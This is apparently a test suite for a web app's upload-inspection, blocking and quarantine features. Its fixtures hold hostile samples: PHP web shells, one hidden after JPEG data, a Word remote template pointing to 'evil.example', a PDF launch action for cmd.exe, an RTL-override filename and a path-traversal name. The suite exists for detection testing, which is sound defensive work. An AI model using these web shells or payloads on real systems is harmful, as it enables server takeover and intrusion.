const request = require('supertest');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const { app } = require('../app');
const User = require('../models/User');
const UploadRecord = require('../models/UploadRecord');
const SecurityIncident = require('../models/SecurityIncident');
const AnalystAction = require('../models/AnalystAction');
const { inspectFile } = require('../lib/fileInspect');
const quarantine = require('../lib/quarantine');
const { recordUpload } = require('../middleware/recordUpload');
const { waitUntil } = require('./helpers');

const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'inspect-'));
process.env.QUARANTINE_DIR = path.join(tmpDir, 'quarantine');
let n = 0;
const write = (buf, name = `f${n++}`) => { const p = path.join(tmpDir, name); fs.writeFileSync(p, buf); return p; };
const codes = (r) => r.findings.map((f) => f.code).sort();

// ── tiny zip writer so the tests use real archives, not mocks ──────────────
function makeZip(files) {
  const locals = [];
  const central = [];
  let offset = 0;
  for (const { name, data } of files) {
    const nameBuf = Buffer.from(name);
    const raw = Buffer.from(data);
    const comp = zlib.deflateRawSync(raw);
    const crc = zlib.crc32(raw);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(8, 8);
    lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(raw.length, 22); lh.writeUInt16LE(nameBuf.length, 26);
    locals.push(lh, nameBuf, comp);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(raw.length, 24); ch.writeUInt16LE(nameBuf.length, 28); ch.writeUInt32LE(offset, 42);
    central.push(ch, nameBuf);
    offset += lh.length + nameBuf.length + comp.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(files.length, 8); eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

const cleanDocxParts = [
  { name: '[Content_Types].xml', data: '<Types/>' },
  { name: 'word/document.xml', data: '<w:document/>' },
  { name: 'word/_rels/document.xml.rels', data: '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>' },
];
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 1), Buffer.from('IEND'), Buffer.from([0xae, 0x42, 0x60, 0x82])]);
const JPG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(40, 2), Buffer.from([0xff, 0xd9])]);
const pdf = (body = '') => Buffer.from(`%PDF-1.7\n1 0 obj\n<< /Type /Catalog ${body} >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF`);

describe('inspectFile — clean files pass', () => {
  it('plain PDF, PNG, JPEG, GIF and a normal .docx (with an ordinary hyperlink) have no findings', () => {
    expect(inspectFile(write(pdf()), 'transcript.pdf')).toMatchObject({ risk: 'none', detectedType: 'pdf', findings: [] });
    expect(inspectFile(write(PNG), 'photo.png').risk).toBe('none');
    expect(inspectFile(write(JPG), 'photo.jpg').risk).toBe('none');
    expect(inspectFile(write(Buffer.concat([Buffer.from('GIF89a'), Buffer.alloc(30)])), 'a.gif').risk).toBe('none');
    expect(inspectFile(write(makeZip(cleanDocxParts)), 'cv.docx')).toMatchObject({ risk: 'none', detectedType: 'zip' });
  });

  it('a CV that merely mentions VBA or Macros is not treated as a macro document', () => {
    const ole = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from('Skills: Excel, VBA, Macros, SQL', 'latin1'), Buffer.from('VBA', 'utf16le')]);
    expect(inspectFile(write(ole), 'cv.doc').risk).toBe('none');
  });
});

describe('inspectFile — risky files', () => {
  it('flags an executable renamed to a document as high', () => {
    const r = inspectFile(write(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100)])), 'passport.pdf');
    expect(r.risk).toBe('high');
    expect(codes(r)).toContain('executable_disguised');
  });

  it('flags scripts/HTML disguised as documents or images as high', () => {
    expect(codes(inspectFile(write('<?php system($_GET["c"]); ?>'), 'photo.jpg'))).toContain('script_disguised');
    expect(codes(inspectFile(write('<html><script>alert(1)</script></html>'), 'doc.pdf'))).toContain('html_disguised');
  });

  it('a different real file type under the wrong extension is medium (allowed but flagged)', () => {
    const r = inspectFile(write(PNG), 'scan.pdf');
    expect(r.risk).toBe('medium');
    expect(codes(r)).toEqual(['type_mismatch']);
  });

  it('detects macros, ActiveX, embeddings and a remote template inside a .docx', () => {
    expect(codes(inspectFile(write(makeZip([...cleanDocxParts, { name: 'word/vbaProject.bin', data: 'x' }])), 'a.docx'))).toContain('macro_in_docx');
    expect(inspectFile(write(makeZip([...cleanDocxParts, { name: 'word/vbaProject.bin', data: 'x' }])), 'a.docx').risk).toBe('high');
    expect(codes(inspectFile(write(makeZip([...cleanDocxParts, { name: 'word/activeX/activeX1.xml', data: 'x' }])), 'a.docx'))).toContain('activex_controls');
    expect(inspectFile(write(makeZip([...cleanDocxParts, { name: 'word/embeddings/oleObject1.bin', data: 'x' }])), 'a.docx')).toMatchObject({ risk: 'medium' });

    const tpl = makeZip([...cleanDocxParts.slice(0, 2), {
      name: 'word/_rels/settings.xml.rels',
      data: '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>',
    }]);
    const r = inspectFile(write(tpl), 'a.docx');
    expect(codes(r)).toContain('remote_template');
    expect(r.risk).toBe('high');
  });

  it('a non-Word zip renamed .docx is high; a corrupt one is medium', () => {
    expect(codes(inspectFile(write(makeZip([{ name: 'payload.exe', data: 'x' }])), 'a.docx'))).toContain('type_mismatch');
    expect(inspectFile(write(makeZip([{ name: 'payload.exe', data: 'x' }])), 'a.docx').risk).toBe('high');
    const corrupt = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(30, 7)]);
    expect(inspectFile(write(corrupt), 'a.docx').risk).toBe('medium');
  });

  it('detects an Office 97 macro stream', () => {
    const ole = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(32), Buffer.from('_VBA_PROJECT', 'utf16le')]);
    const r = inspectFile(write(ole), 'old.doc');
    expect(codes(r)).toContain('macro_in_doc');
    expect(r.risk).toBe('high');
  });

  it('PDF: /Launch is high; JavaScript (even hex-obfuscated) is medium; embedded files are medium', () => {
    expect(inspectFile(write(pdf('/OpenAction << /S /Launch /F (cmd.exe) >>')), 'a.pdf').risk).toBe('high');
    const js = inspectFile(write(pdf('/Names << /JavaScript 5 0 R >>')), 'a.pdf');
    expect(js.risk).toBe('medium');
    expect(codes(js)).toContain('pdf_javascript');
    expect(codes(inspectFile(write(pdf('/S /J#61vaScript /JS (app.alert(1))')), 'a.pdf'))).toContain('pdf_javascript'); // obfuscated name
    expect(codes(inspectFile(write(pdf('/EmbeddedFile 4 0 R')), 'a.pdf'))).toContain('pdf_embedded_file');
    expect(codes(inspectFile(write(pdf('/OpenAction 3 0 R /JS (x)')), 'a.pdf'))).toContain('pdf_auto_action');
  });

  it('images: trailing data is medium; hidden script is high; ordinary images are clean', () => {
    expect(codes(inspectFile(write(Buffer.concat([PNG, Buffer.alloc(500, 9)])), 'a.png'))).toContain('trailing_data');
    expect(codes(inspectFile(write(Buffer.concat([JPG, Buffer.alloc(500, 9)])), 'a.jpg'))).toContain('trailing_data');
    const shell = inspectFile(write(Buffer.concat([JPG, Buffer.from('<?php eval($_POST[1]); ?>')])), 'a.jpg');
    expect(shell.risk).toBe('high');
    expect(codes(shell)).toContain('embedded_script');
  });

  it('flags deceptive filenames', () => {
    expect(codes(inspectFile(write(pdf()), 'invoice‮fdp.exe'))).toContain('rtl_override');
    expect(inspectFile(write(pdf()), 'invoice.exe.pdf').risk).toBe('high');
    expect(codes(inspectFile(write(Buffer.alloc(0)), 'empty.pdf'))).toContain('empty_file');
  });

  it('never throws on unreadable or hostile input', () => {
    expect(inspectFile(path.join(tmpDir, 'does-not-exist.pdf'), 'x.pdf').findings[0].code).toBe('unreadable');
    expect(() => inspectFile(write(Buffer.from([0x50, 0x4b, 0x03, 0x04, 0xff, 0xff])), 'x.docx')).not.toThrow();
  });
});

describe('upload gate (recordUpload)', () => {
  const mkRes = () => { const res = { statusCode: 0, body: null }; res.status = (c) => { res.statusCode = c; return res; }; res.json = (b) => { res.body = b; return res; }; return res; };
  const mkReq = (filePath, originalname, user) => ({
    file: { path: filePath, originalname, filename: path.basename(filePath), mimetype: 'application/pdf', size: fs.statSync(filePath).size },
    user, ip: '203.0.113.50', headers: {}, app: { get: () => null },
  });
  const login = async (role) => {
    const email = `fi-${role}-${Date.now()}-${n++}@example.com`;
    await request(app).post('/api/auth/register').send({ name: 'FI', email, password: 'TestPass123!' });
    await User.findOneAndUpdate({ email }, { emailVerified: true, role });
    const res = await request(app).post('/api/auth/login').send({ email, password: 'TestPass123!' });
    return { token: res.body.token, id: res.body.user.id, email };
  };

  it('blocks a disguised executable: 400 to the user, file moved out of reach, record + incident created', async () => {
    const u = await login('student');
    const file = write(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200)]), `blocked-${Date.now()}.pdf`);
    const res = mkRes();
    const next = vi.fn();
    await recordUpload('student_document')(mkReq(file, 'passport.pdf', { id: u.id, email: u.email, role: 'student' }), res, next);

    expect(next).not.toHaveBeenCalled();
    expect(res.statusCode).toBe(400);
    expect(res.body.message).toMatch(/blocked by a security check/);
    expect(fs.existsSync(file)).toBe(false);
    expect(quarantine.inQuarantine(path.basename(file))).toBe(true);

    const rec = await UploadRecord.findOne({ userId: u.id });
    expect(rec).toMatchObject({ blocked: true, quarantined: true });
    expect(rec.inspection.risk).toBe('high');
    expect(rec.quarantineReason).toContain('executable_disguised');
    const inc = await SecurityIncident.findOne({ type: 'malware_upload', relatedUserId: u.id });
    expect(inc.severity).toBe('high');
    expect(inc.title).toContain('passport.pdf');
  });

  it('lets a medium-risk file through, flagged on its record', async () => {
    const u = await login('student');
    const file = write(pdf('/Names << /JavaScript 5 0 R >>'), `js-${Date.now()}.pdf`);
    const res = mkRes();
    const next = vi.fn();
    await recordUpload('student_document')(mkReq(file, 'form.pdf', { id: u.id, email: u.email, role: 'student' }), res, next);
    expect(next).toHaveBeenCalledOnce();
    expect(fs.existsSync(file)).toBe(true);
    const rec = await UploadRecord.findOne({ userId: u.id });
    expect(rec).toMatchObject({ blocked: false, quarantined: false });
    expect(rec.inspection.risk).toBe('medium');
    expect(rec.inspection.findings.map((f) => f.code)).toContain('pdf_javascript');
  });

  it('a clean file passes with risk none', async () => {
    const u = await login('student');
    const file = write(pdf(), `clean-${Date.now()}.pdf`);
    const next = vi.fn();
    await recordUpload('student_document')(mkReq(file, 'ok.pdf', { id: u.id, email: u.email, role: 'student' }), mkRes(), next);
    expect(next).toHaveBeenCalledOnce();
    expect((await UploadRecord.findOne({ userId: u.id })).inspection.risk).toBe('none');
  });
});

describe('SOC quarantine actions', () => {
  const login = async (role) => {
    const email = `qa-${role}-${Date.now()}-${n++}@example.com`;
    await request(app).post('/api/auth/register').send({ name: 'QA', email, password: 'TestPass123!' });
    await User.findOneAndUpdate({ email }, { emailVerified: true, role });
    const res = await request(app).post('/api/auth/login').send({ email, password: 'TestPass123!' });
    return { token: res.body.token, id: res.body.user.id, email };
  };
  const auth = (t) => ({ Authorization: `Bearer ${t}` });

  it('quarantine → restore → quarantine → purge moves the real file and is audited', async () => {
    const admin = await login('admin');
    const owner = await login('student');
    const storedName = `qa-${Date.now()}.pdf`;
    const livePath = path.join(quarantine.UPLOADS_DIR, storedName);
    fs.mkdirSync(quarantine.UPLOADS_DIR, { recursive: true });
    fs.writeFileSync(livePath, 'document body');
    const rec = await UploadRecord.create({ userId: owner.id, email: owner.email, originalName: 'x.pdf', storedName, sha256: 'a'.repeat(64) });
    const act = (action, extra = {}) => request(app).post(`/api/soc/uploads/${rec._id}/quarantine`).set(auth(admin.token)).send({ action, ...extra });

    let res = await act('quarantine', { reason: 'VT flagged' });
    expect(res.status).toBe(200);
    expect(res.body.quarantined).toBe(true);
    expect(fs.existsSync(livePath)).toBe(false);          // no longer served from /uploads
    expect(quarantine.inQuarantine(storedName)).toBe(true);

    expect((await act('quarantine')).status).toBe(409);   // already quarantined

    res = await act('restore');
    expect(res.status).toBe(200);
    expect(res.body.quarantined).toBe(false);
    expect(fs.readFileSync(livePath, 'utf8')).toBe('document body');

    expect((await act('purge')).status).toBe(409);        // must be quarantined first
    await act('quarantine');
    res = await act('purge');
    expect(res.status).toBe(200);
    expect(res.body.purgedAt).toBeTruthy();
    expect(quarantine.inQuarantine(storedName)).toBe(false);
    expect(fs.existsSync(livePath)).toBe(false);

    await waitUntil(async () => (await AnalystAction.countDocuments({ targetId: String(rec._id) })) >= 5);
    const acts = (await AnalystAction.find({ targetId: String(rec._id) }).lean()).map((a) => a.action);
    expect(acts).toEqual(expect.arrayContaining(['quarantine_upload', 'restore_upload', 'purge_upload']));
  });

  it('cannot quarantine a file that is not on local disk, and cannot restore a blocked upload; admin-only', async () => {
    const admin = await login('admin');
    const student = await login('student');
    const gone = await UploadRecord.create({ userId: student.id, email: student.email, originalName: 'g.pdf', storedName: `missing-${Date.now()}.pdf`, sha256: 'b'.repeat(64) });
    const res = await request(app).post(`/api/soc/uploads/${gone._id}/quarantine`).set(auth(admin.token)).send({ action: 'quarantine' });
    expect(res.status).toBe(409);
    expect(res.body.message).toMatch(/not on local disk/);

    const blockedName = `blk-${Date.now()}.pdf`;
    fs.mkdirSync(quarantine.quarantineDir(), { recursive: true });
    fs.writeFileSync(path.join(quarantine.quarantineDir(), blockedName), 'MZ');
    const blocked = await UploadRecord.create({ userId: student.id, email: student.email, originalName: 'b.pdf', storedName: blockedName, sha256: 'c'.repeat(64), blocked: true, quarantined: true });
    const restore = await request(app).post(`/api/soc/uploads/${blocked._id}/quarantine`).set(auth(admin.token)).send({ action: 'restore' });
    expect(restore.status).toBe(409);
    expect(restore.body.message).toMatch(/cannot be restored/);

    expect((await request(app).post(`/api/soc/uploads/${gone._id}/quarantine`).set(auth(student.token)).send({ action: 'quarantine' })).status).toBe(403);
    expect((await request(app).post(`/api/soc/uploads/${gone._id}/quarantine`).set(auth(admin.token)).send({ action: 'nuke' })).status).toBe(400);
  });

  it('path traversal in a stored name cannot escape the uploads folder', () => {
    const outside = path.join(tmpDir, 'outside-secret.txt');
    fs.writeFileSync(outside, 'secret');
    const r = quarantine.quarantineStored('../../' + path.relative(path.join(quarantine.UPLOADS_DIR, '..', '..'), outside));
    expect(r.ok).toBe(false);
    expect(fs.existsSync(outside)).toBe(true);
  });

  it('the Uploads list can filter to files needing review and reports the count', async () => {
    const admin = await login('admin');
    const student = await login('student');
    const tag = `rv${Date.now()}`;
    await UploadRecord.create({ userId: student.id, email: student.email, originalName: `${tag}-risky.pdf`, sha256: 'd'.repeat(64), inspection: { risk: 'medium', findings: [{ code: 'pdf_javascript', severity: 'medium', detail: 'x' }] } });
    await UploadRecord.create({ userId: student.id, email: student.email, originalName: `${tag}-fine.pdf`, sha256: 'e'.repeat(64) });
    const res = await request(app).get('/api/soc/uploads').query({ risk: 'review', q: tag }).set(auth(admin.token));
    expect(res.status).toBe(200);
    expect(res.body.uploads.map((u) => u.originalName)).toEqual([`${tag}-risky.pdf`]);
    expect(res.body.needsReview).toBeGreaterThanOrEqual(1);
  });
});
